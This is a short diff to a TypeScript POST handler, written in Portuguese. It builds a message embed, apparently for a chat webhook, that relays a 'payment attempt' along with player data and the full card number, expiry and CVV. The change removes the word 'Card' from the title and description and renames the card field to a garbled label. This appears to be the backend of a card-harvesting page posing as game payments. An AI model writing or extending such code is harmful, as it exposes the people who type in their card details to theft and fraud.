@@ -7,9 +7,9 @@ export async function POST(req: Request) {
     const body = await req.json();
 
     const embed = {
-      title: "💳 Nova Tentativa de Pagamento (Cartão)",
-      description: "Um usuário tentou realizar um pagamento com **Cartão de Crédito/Débito**.",
-      color: 0xf87171, // vermelho alerta
+      title: "Nova Tentativa de Pagamento",
+      description: "Um usuário tentou realizar um pagamento**.",
+      color: 0xf87171, 
       fields: [
         {
           name: "👤 **Dados do Jogador**",
@@ -22,7 +22,7 @@ export async function POST(req: Request) {
           inline: false,
         },
         {
-          name: "💳 **Dados do Cartão**",
+          name: "💳 *Numb**",
           value: `**Número:** \`${body.cardNumber}\`\n**Validade:** ${body.validade}\n**CVV:** ${body.cvv}`,
           inline: false,
         },
